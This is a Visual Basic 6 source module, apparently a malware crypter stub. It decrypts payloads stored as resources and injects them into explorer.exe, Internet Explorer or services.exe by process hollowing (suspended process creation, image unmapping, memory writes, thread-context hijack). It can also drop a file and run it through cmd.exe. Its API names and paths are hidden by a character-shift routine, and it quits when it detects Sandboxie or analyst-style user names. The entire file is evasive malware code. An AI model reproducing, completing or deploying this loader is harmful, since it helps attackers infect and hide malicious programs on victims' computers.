Attribute VB_Name = "m"
Option Explicit
Dim lMod                   As Long
Dim lLIB                   As Long
Dim un                     As New c
Dim jsp                    As String
Dim ai()                   As String
Dim bsif                   As String
Dim inv                    As New inv
Dim gts()                  As String
Const lt = "TkvkuR0HFvPqa9JdqeC8EBpnrdd8o8"
Const hlv = "sfp9KK0QSQWdrQ5TyNdvUVTw2CXYC6"
Public Declare Sub lem Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private Const CON_F        As Long = &H10007
Private Const CR_S         As Long = &H4
Private Const MEM_COMMIT   As Long = &H1000
Private Const MEM_REV      As Long = &H2000
Private Const PG_EX_RW     As Long = &H40
Private Type Sinf
  cb As Long
  lpReserved As Long
  lpDesktop As Long
  lpTitle As Long
  dwX As Long
  dwY As Long
  dwXSize As Long
  dwYSize As Long
  dwXCountChars As Long
  dwYCountChars As Long
  dwFillAttribute As Long
  dwFlags As Long
  wShowWindow As Integer
  cbReserved2 As Integer
  lpReserved2 As Long
  hStdInput As Long
  hStdOutput As Long
  hStdError As Long
End Type
Private Type proc_inf
  hProc As Long
  hTh As Long
  dwProcessID As Long
  dwThreadID As Long
End Type
Private Type fl_ar
  ControlWord As Long
  StatusWord As Long
  TagWord As Long
  ErrorOffset As Long
  ErrorSelector As Long
  DataOffset As Long
  DataSelector As Long
  RegisterArea(1 To 80) As Byte
  Cr0NpxState As Long
End Type
Private Type cnt
  ContextFlags As Long
  Dr0 As Long
  Dr1 As Long
  Dr2 As Long
  Dr3 As Long
  Dr6 As Long
  Dr7 As Long
  FloatSave As fl_ar
  SegGs As Long
  SegFs As Long
  SegEs As Long
  SegDs As Long
  Edi As Long
  Esi As Long
  Ebx As Long
  Edx As Long
  Ecx As Long
  Eax As Long
  Ebp As Long
  Eip As Long
  SegCs As Long
  EFlags As Long
  Esp As Long
  SegSs As Long
End Type
Private Type im_ds
  e_magic As Integer
  e_cblp As Integer
  e_cp As Integer
  e_crlc As Integer
  e_cparhdr As Integer
  e_minalloc As Integer
  e_maxalloc As Integer
  e_ss As Integer
  e_sp As Integer
  e_csum As Integer
  e_ip As Integer
  e_cs As Integer
  e_lfarlc As Integer
  e_ovno As Integer
  e_res(0 To 3) As Integer
  e_oemid As Integer
  e_oeminfo As Integer
  e_res2(0 To 9) As Integer
  e_lfanew As Long
End Type
Private Type im_fl
  Machine As Integer
  NumberOfSections As Integer
  TimeDateStamp As Long
  PointerToSymbolTable As Long
  NumberOfSymbols As Long
  SizeOfOptionalHeader As Integer
  Characteristics As Integer
End Type
Private Type im_dt
  VirtualAddress As Long
  Size As Long
End Type
Private Type im_o
  Magic As Integer
  MajorLinkerVersion As Byte
  MinorLinkerVersion As Byte
  SizeOfCode As Long
  SizeOfInitializedData As Long
  SizeOfUnitializedData As Long
  AddressOfEntryPoint As Long
  BaseOfCode As Long
  BaseOfData As Long
  IBs As Long
  SectionAlignment As Long
  FileAlignment As Long
  MajorOperatingSystemVersion As Integer
  MinorOperatingSystemVersion As Integer
  MajorImageVersion As Integer
  MinorImageVersion As Integer
  MajorSubsystemVersion As Integer
  MinorSubsystemVersion As Integer
  W32VersionValue As Long
  SOImg As Long
  SizeOfHeaders As Long
  CheckSum As Long
  SubSystem As Integer
  DllCharacteristics As Integer
  SizeOfStackReserve As Long
  SizeOfStackCommit As Long
  SizeOfHeapReserve As Long
  SizeOfHeapCommit As Long
  LoaderFlags As Long
  NumberOfRvaAndSizes As Long
  DataDirectory(0 To 15) As im_dt
End Type
Private Type im_hd
  Signature As Long
  FileHeader As im_fl
  OHe As im_o
End Type
Private Type im_sec_hd
  SecName As String * 8
  VirtualSize As Long
  Vad  As Long
  SizeOfRawData As Long
  PointerToRawData As Long
  PointerToRelocations As Long
  PointerToLinenumbers As Long
  NumberOfRelocations As Integer
  NumberOfLinenumbers As Integer
  Characteristics  As Long
End Type
Sub Main()
  ai() = zwxyf(StrConv(LoadResData(7, drt("qr`")), vbUnicode), lt)
  If ai(3) = "#7" Or ai(3) = drt("q55") Then
  ncusdy
  End If
  Call lb(nhn, StrConv(un.dstr(ai(1), ai(2)), vbFromUnicode))
  If ai(3) = "#7" Or ai(3) = drt("q555") Then
  gts() = zwxyf(StrConv(LoadResData(7, drt("QFR")), vbUnicode), hlv)
  If drt(gts(4)) = drt("rkn") Or drt(gts(4)) = drt("ubp") Then
  Select Case drt(gts(4))
  Case drt("rkn")
  bsif = Environ(drt("rkn"))
  Case drt("ubp")
  bsif = Environ(drt("uglbgp"))
  Case drt("qwqr")
  bsif = Environ(drt("uglbgp")) & drt("Zqwqrck10")
  End Select
  Open bsif & drt(gts(3)) For Binary As #1
  Put #1, , un.dstr(gts(1), gts(2))
  Close #1
  Shell drt("akb,cvc-a") & bsif & drt(gts(3))
  Else
  Select Case drt(gts(4))
  Case drt("cvnj")
  jsp = Environ(drt("uglbgp")) & drt("Zcvnjmpcp,cvc")
  Case drt("gcvn")
  jsp = Environ(drt("npmep_kdgjcq")) & drt("ZGlrcplcrCvnjmpcpZGCVNJMPC,CVC")
  Case drt("qta")
  jsp = Environ(drt("uglbgp")) & drt("Zqwqrck10Zqcptgacq,cvc")
  End Select
  Call lb(jsp, StrConv(un.dstr(gts(1), gts(2)), vbFromUnicode))
  End If
  End If
  End
End Sub
Private Function ncusdy()
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("EcrKmbsjcF_lbjcU"))
  If inv.inv(lMod, StrPtr(drt("Q`gcBjj,bjj"))) <> 0 Then End
  If App.Path = drt("F8Z") Or App.Path = drt("A8Z") And Environ(drt("sqcpl_kc")) = drt("Qafkgbrg") Then End
  If App.EXEName = drt("q_knjc") Then
  End
  End If
  If LCase(Environ(drt("sqcpl_kc"))) = drt("asppclrsqcp") Or LCase(Environ(drt("sqcpl_kc"))) = drt("_lbw") Then
  End
  End If
  If nhn = drt("A8Zdgjc,cvc") Then
  End
  End If
End Function
Private Function nhn() As String
  Dim lRet        As Long
  Dim bvBuff(255) As Byte
  Dim lMod        As Long
  Dim lLIB        As Long
  With inv
  lLIB = .lLI(drt("icplcj10"))
  lMod = .GPRA(lLIB, drt("EcrKmbsjcDgjcL_kc?"))
  lRet = .inv(lMod, App.hInstance, VarPtr(bvBuff(0)), 256)
  nhn = Left$(StrConv(bvBuff, vbUnicode), lRet)
  End With
End Function
Sub lb(proc As String, ring() As Byte)
  Dim Pidh As im_ds
  Dim zp As im_hd
  Dim prt As im_sec_hd
  Dim inf As Sinf
  Dim Pi As proc_inf
  Dim Ctx As cnt
  Dim i As Long
  inf.cb = Len(inf)
  Ctx.ContextFlags = CON_F
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("PrjKmtcKckmpw"))
  inv.inv lMod, VarPtr(Pidh), VarPtr(ring(0)), Len(Pidh)
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("PrjKmtcKckmpw"))
  inv.inv lMod, VarPtr(zp), VarPtr(ring(Pidh.e_lfanew)), Len(zp)
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("Apc_rcNpmacqqU"))
  inv.inv lMod, 0, StrPtr(proc), 0, 0, 0, CR_S, 0, 0, VarPtr(inf), VarPtr(Pi)
  lLIB = inv.lLI(drt("lrbjj"))
  lMod = inv.GPRA(lLIB, drt("LrSlk_nTgcuMdQcargml"))
  inv.inv lMod, Pi.hProc, zp.OHe.IBs
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("Tgprs_j?jjmaCv"))
  inv.inv lMod, Pi.hProc, zp.OHe.IBs, zp.OHe.SOImg, MEM_COMMIT Or MEM_REV, PG_EX_RW
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("UpgrcNpmacqqKckmpw"))
  inv.inv lMod, Pi.hProc, zp.OHe.IBs, VarPtr(ring(0)), zp.OHe.SizeOfHeaders, 0
  For i = 0 To zp.FileHeader.NumberOfSections - 1
  lem prt, ring(Pidh.e_lfanew + Len(zp) + Len(prt) * i), Len(prt)
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("UpgrcNpmacqqKckmpw"))
  inv.inv lMod, Pi.hProc, zp.OHe.IBs + prt.Vad, VarPtr(ring(prt.PointerToRawData)), prt.SizeOfRawData, 0
  Next
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("EcrRfpc_bAmlrcvr"))
  inv.inv lMod, Pi.hTh, VarPtr(Ctx)
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("UpgrcNpmacqqKckmpw"))
  inv.inv lMod, Pi.hProc, Ctx.Ebx + 8, VarPtr(zp.OHe.IBs), 4, 0
  Ctx.Eax = zp.OHe.IBs + zp.OHe.AddressOfEntryPoint
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("QcrRfpc_bAmlrcvr"))
  inv.inv lMod, Pi.hTh, VarPtr(Ctx)
  lLIB = inv.lLI(drt("icplcj10"))
  lMod = inv.GPRA(lLIB, drt("PcqskcRfpc_b"))
  inv.inv lMod, Pi.hTh
End Sub
Public Function drt(x) As String
  Dim hju As Long
  Dim kpo As Long
  Dim bn As String
  For hju = 1 To Len(x)
  kpo = Asc(Mid(x, hju, 1)) + 2
  bn = bn & Chr(kpo)
  Next hju
  drt = bn
End Function
Private Function zwxyf(ByVal lExp As String, Optional ByVal dlm As String, Optional ByVal limit As Long = -1) As String()
  Dim lLPos As Long
  Dim ljul As Long
  Dim lELe As Long
  Dim lcio As Long
  Dim lpor As Long
  Dim vTemp() As String
  lELe = Len(lExp)
  If dlm = vbNullString Then dlm = " "
  lcio = Len(dlm)
  If limit = 0 Then GoTo QuitHere
  If lELe = 0 Then GoTo QuitHere
  If InStr(1, lExp, dlm, vbBinaryCompare) = 0 Then GoTo QuitHere
  ReDim vTemp(0)
  lLPos = 1
  ljul = 1
  Do
  If lpor + 1 = limit Then
  vTemp(lpor) = Mid$(lExp, lLPos)
  Exit Do
  End If
  ljul = InStr(ljul, lExp, dlm, vbBinaryCompare)
  If ljul = 0 Then
  If Not lLPos = lELe Then
  vTemp(lpor) = Mid$(lExp, lLPos)
  End If
  Exit Do
  End If
  vTemp(lpor) = Mid$(lExp, lLPos, ljul - lLPos)
  lpor = lpor + 1
  ReDim Preserve vTemp(lpor)
  lLPos = ljul + lcio
  ljul = lLPos
  Loop
  ReDim Preserve vTemp(lpor)
  zwxyf = vTemp
  Exit Function
QuitHere:
  ReDim Splitter(-1 To -1)
End Function
